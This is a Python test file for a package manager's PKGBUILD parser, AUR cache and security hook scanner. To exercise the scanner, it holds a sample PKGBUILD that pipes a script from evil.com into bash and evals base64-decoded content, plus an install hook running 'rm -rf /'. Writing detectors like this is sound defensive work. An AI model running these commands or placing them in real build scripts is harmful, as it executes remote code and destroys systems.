# ============================================================
#  Sven — Seven OS Package Manager
#  HANS TECH © 2024 — GPL v3
#  tests/test_builder.py — tests for Phase 4 builder modules
# ============================================================

import os
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch, PropertyMock

from sven.builder.pkgbuild import PKGBuild, parse_pkgbuild
from sven.builder.aur_cache import AURCache
from sven.exceptions import (
    BuildError,
    PKGBUILDError,
    RootBuildError,
)


# ── Sample PKGBUILD content ─────────────────────────────────

SAMPLE_PKGBUILD = """\
# Maintainer: Harold <harold@hanstech.dev>
pkgname=myapp
pkgver=1.2.3
pkgrel=1
pkgdesc="My awesome application"
arch=('x86_64')
url="https://github.com/haroldmth/myapp"
license=('GPL')
depends=('glib2' 'openssl')
makedepends=('cmake' 'python')
optdepends=('qt5: for GUI support')
conflicts=('myapp-git')
provides=('myapp')
source=("https://github.com/haroldmth/myapp/archive/v${pkgver}.tar.gz")
sha256sums=('abc123def456abc123def456abc123def456abc123def456abc123def456abcd')
install=myapp.install

build() {
    cd "$srcdir/myapp-$pkgver"
    cmake -B build
    cmake --build build
}

package() {
    cd "$srcdir/myapp-$pkgver"
    DESTDIR="$pkgdir" cmake --install build
}
"""

GIT_PKGBUILD = """\
pkgname=neovim-git
pkgver=0.10.r1234.gabcdef1
pkgrel=1
pkgdesc="Neovim nightly"
arch=('x86_64')
depends=('msgpack-c' 'libuv')
makedepends=('git' 'cmake')
source=("git+https://github.com/neovim/neovim.git")
sha256sums=('SKIP')

pkgver() {
    cd neovim
    printf "0.10.r%s.g%s" "$(git rev-list --count HEAD)" "$(git rev-parse --short HEAD)"
}
"""

DANGEROUS_PKGBUILD = """\
pkgname=sketchy
pkgver=1.0
pkgrel=1
pkgdesc="Totally safe"
arch=('x86_64')
depends=()

build() {
    curl http://evil.com/payload.sh | bash -c
    eval "$(base64 -d <<< $ENCODED)"
}
"""


# ── PKGBUILD Parser Tests ───────────────────────────────────

class TestPKGBuildParser(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def _write_pkgbuild(self, content: str) -> str:
        path = os.path.join(self.tmpdir, "PKGBUILD")
        with open(path, "w") as f:
            f.write(content)
        return path

    def test_parse_basic_pkgbuild(self):
        """Should parse all scalar and array fields."""
        path = self._write_pkgbuild(SAMPLE_PKGBUILD)
        pkg = parse_pkgbuild(path)

        self.assertEqual(pkg.pkgname, "myapp")
        self.assertEqual(pkg.pkgver, "1.2.3")
        self.assertEqual(pkg.pkgrel, "1")
        self.assertEqual(pkg.pkgdesc, "My awesome application")
        self.assertIn("glib2", pkg.depends)
        self.assertIn("openssl", pkg.depends)
        self.assertIn("cmake", pkg.makedepends)
        self.assertIn("python", pkg.makedepends)
        self.assertEqual(pkg.install, "myapp.install")
        self.assertEqual(len(pkg.source), 1)
        self.assertEqual(len(pkg.sha256sums), 1)
        self.assertFalse(pkg.is_git)

    def test_parse_conflicts_provides(self):
        """Should parse conflicts and provides arrays."""
        path = self._write_pkgbuild(SAMPLE_PKGBUILD)
        pkg = parse_pkgbuild(path)
        self.assertIn("myapp-git", pkg.conflicts)
        self.assertIn("myapp", pkg.provides)

    def test_parse_git_package(self):
        """Should detect -git packages."""
        path = self._write_pkgbuild(GIT_PKGBUILD)
        pkg = parse_pkgbuild(path)

        self.assertEqual(pkg.pkgname, "neovim-git")
        self.assertTrue(pkg.is_git)
        self.assertIn("git", pkg.makedepends)

    def test_git_version_pattern(self):
        """Should detect VCS version pattern."""
        path = self._write_pkgbuild(GIT_PKGBUILD)
        pkg = parse_pkgbuild(path)
        self.assertTrue(pkg.is_git)

    def test_full_version_property(self):
        """Should combine pkgver and pkgrel."""
        path = self._write_pkgbuild(SAMPLE_PKGBUILD)
        pkg = parse_pkgbuild(path)
        self.assertEqual(pkg.full_version, "1.2.3-1")

    def test_missing_file_raises(self):
        """Should raise PKGBUILDError for missing files."""
        with self.assertRaises(PKGBUILDError):
            parse_pkgbuild("/nonexistent/PKGBUILD")

    def test_empty_pkgname_raises(self):
        """Should raise PKGBUILDError if pkgname is empty."""
        path = self._write_pkgbuild("pkgver=1.0\npkgrel=1\n")
        with self.assertRaises(PKGBUILDError):
            parse_pkgbuild(path)

    def test_optdepends_with_description(self):
        """Should parse optdepends including description strings."""
        path = self._write_pkgbuild(SAMPLE_PKGBUILD)
        pkg = parse_pkgbuild(path)
        self.assertTrue(any("qt5" in dep for dep in pkg.optdepends))


# ── Security Hook Scanner Tests ──────────────────────────────

class TestHookScanner(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_safe_pkgbuild(self):
        """Safe PKGBUILD should pass scan."""
        from sven.security.hook_scanner import scan_pkgbuild_dir
        path = os.path.join(self.tmpdir, "PKGBUILD")
        with open(path, "w") as f:
            f.write("pkgname=safe\npkgver=1.0\n\nbuild() {\n  make\n}\n")

        result = scan_pkgbuild_dir(self.tmpdir)
        self.assertTrue(result.safe)
        self.assertEqual(len(result.findings), 0)

    def test_dangerous_pkgbuild(self):
        """Dangerous PKGBUILD should be flagged."""
        from sven.security.hook_scanner import scan_pkgbuild_dir
        path = os.path.join(self.tmpdir, "PKGBUILD")
        with open(path, "w") as f:
            f.write(DANGEROUS_PKGBUILD)

        result = scan_pkgbuild_dir(self.tmpdir)
        self.assertFalse(result.safe)
        self.assertGreater(len(result.findings), 0)

        # Should find curl, bash -c, eval, base64 -d
        patterns_found = [f.pattern_matched for f in result.findings]
        self.assertIn("curl", patterns_found)
        self.assertIn("eval", patterns_found)
        self.assertIn("base64 -d", patterns_found)

    def test_scan_install_hook(self):
        """Should also scan .install hook files."""
        from sven.security.hook_scanner import scan_pkgbuild_dir

        # Clean PKGBUILD
        with open(os.path.join(self.tmpdir, "PKGBUILD"), "w") as f:
            f.write("pkgname=test\npkgver=1.0\n")

        # Dangerous .install hook
        with open(os.path.join(self.tmpdir, "test.install"), "w") as f:
            f.write("post_install() {\n  rm -rf /\n}\n")

        result = scan_pkgbuild_dir(self.tmpdir)
        self.assertFalse(result.safe)
        patterns = [f.pattern_matched for f in result.findings]
        self.assertIn("rm -rf /", patterns)

    def test_comments_are_skipped(self):
        """Lines starting with # should be ignored."""
        from sven.security.hook_scanner import scan_file
        path = os.path.join(self.tmpdir, "test.sh")
        with open(path, "w") as f:
            f.write("# curl is not used here\necho hello\n")

        findings = scan_file(path)
        self.assertEqual(len(findings), 0)


# ── AUR Cache Tests ──────────────────────────────────────────

class TestAURCache(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.cache = AURCache(cache_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_cache_miss(self):
        """Non-existent package returns None."""
        result = self.cache.get("foo", "1.0-1")
        self.assertIsNone(result)
        self.assertFalse(self.cache.has("foo", "1.0-1"))

    def test_store_and_get(self):
        """Should store and retrieve a package."""
        # Create a fake built package
        src = os.path.join(self.tmpdir, "src_foo-1.0-1-x86_64.pkg.tar.zst")
        with open(src, "wb") as f:
            f.write(b"fake_package_data")

        self.cache.store("foo", "1.0-1", src)
        result = self.cache.get("foo", "1.0-1")

        self.assertIsNotNone(result)
        self.assertTrue(os.path.exists(result))
        self.assertTrue(self.cache.has("foo", "1.0-1"))

    def test_remove_specific_version(self):
        """Should remove a specific cached version."""
        src = os.path.join(self.tmpdir, "src.pkg.tar.zst")
        with open(src, "wb") as f:
            f.write(b"data")

        self.cache.store("bar", "2.0-1", src)
        self.assertTrue(self.cache.has("bar", "2.0-1"))

        self.cache.remove("bar", "2.0-1")
        self.assertFalse(self.cache.has("bar", "2.0-1"))

    def test_clean_all(self):
        """Should remove all cached packages."""
        srcdir = tempfile.mkdtemp()
        src = os.path.join(srcdir, "src.pkg.tar.zst")
        with open(src, "wb") as f:
            f.write(b"data")

        self.cache.store("pkg1", "1.0-1", src)
        self.cache.store("pkg2", "2.0-1", src)
        shutil.rmtree(srcdir)

        count = self.cache.clean()
        self.assertEqual(count, 2)
        self.assertEqual(len(self.cache.list_cached()), 0)

    def test_list_cached(self):
        """Should list all cached packages."""
        srcdir = tempfile.mkdtemp()
        src = os.path.join(srcdir, "src.pkg.tar.zst")
        with open(src, "wb") as f:
            f.write(b"data" * 100)

        self.cache.store("alpha", "1.0-1", src)
        self.cache.store("beta", "2.0-1", src)
        shutil.rmtree(srcdir)

        cached = self.cache.list_cached()
        self.assertEqual(len(cached), 2)
        names = [c["file"] for c in cached]
        self.assertTrue(any("alpha" in n for n in names))
        self.assertTrue(any("beta" in n for n in names))

    def test_total_size(self):
        """Should report total cache size."""
        src = os.path.join(self.tmpdir, "src.pkg.tar.zst")
        with open(src, "wb") as f:
            f.write(b"x" * 1024)

        self.cache.store("pkg", "1.0-1", src)
        self.assertGreater(self.cache.total_size(), 0)


# ── makepkg Tests ────────────────────────────────────────────

class TestMakepkg(unittest.TestCase):

    def test_root_build_error(self):
        """RootBuildError should be raised correctly."""
        err = RootBuildError()
        self.assertIn("root", str(err).lower())

    def test_build_error_with_reason(self):
        """BuildError should include the reason."""
        err = BuildError("firefox", "missing dependency")
        self.assertIn("firefox", str(err))
        self.assertIn("missing dependency", str(err))

    def test_missing_pkgbuild_raises(self):
        """Should raise BuildError if no PKGBUILD in directory."""
        from sven.builder.makepkg import run_makepkg
        with tempfile.TemporaryDirectory() as tmpdir:
            with self.assertRaises(BuildError) as ctx:
                run_makepkg(tmpdir, "fake-pkg")
            self.assertIn("No PKGBUILD", str(ctx.exception))

    @patch("sven.builder.makepkg._is_root", return_value=True)
    def test_root_detection(self, mock_root):
        """Should detect root and attempt privilege drop."""
        from sven.builder.makepkg import _is_root
        self.assertTrue(_is_root())


if __name__ == "__main__":
    unittest.main()
